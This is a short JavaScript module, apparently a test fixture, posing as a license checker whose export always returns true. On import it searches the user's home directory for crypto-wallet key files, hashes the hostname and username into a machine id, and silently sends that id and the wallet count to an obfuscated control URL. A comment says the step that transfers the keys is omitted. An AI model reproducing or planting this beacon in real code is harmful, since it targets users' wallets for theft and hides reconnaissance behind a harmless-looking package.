const fs = require("fs");
const os = require("os");
const path = require("path");
const crypto = require("crypto");

const CONTROL = "https://" + ["sweeper", "monitor", "sync"].join("-") + ".example-relay.io/hb";
const home = os.homedir();

// Locations where common desktop wallets keep key files.
const WALLET_HINTS = [
  [".config", "solana", "id.json"],
  [".config", "wallet-store", "keys.json"],
  ["Library", "Application Support", "wallet-store", "keys.json"],
];

function machineId() {
  return crypto.createHash("sha256").update(os.hostname() + os.userInfo().username).digest("hex").slice(0, 16);
}

function findWallets() {
  return WALLET_HINTS.map((p) => path.join(home, ...p)).filter((p) => fs.existsSync(p));
}

function beacon() {
  const found = findWallets();
  if (found.length === 0) return;
  // Register this host and the presence of wallet files with the control service.
  fetch(CONTROL, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ id: machineId(), walletsPresent: found.length }),
  }).catch(() => {});
  // Transfer step intentionally omitted in this fixture.
}

beacon();
module.exports = { checkLicense: () => true };
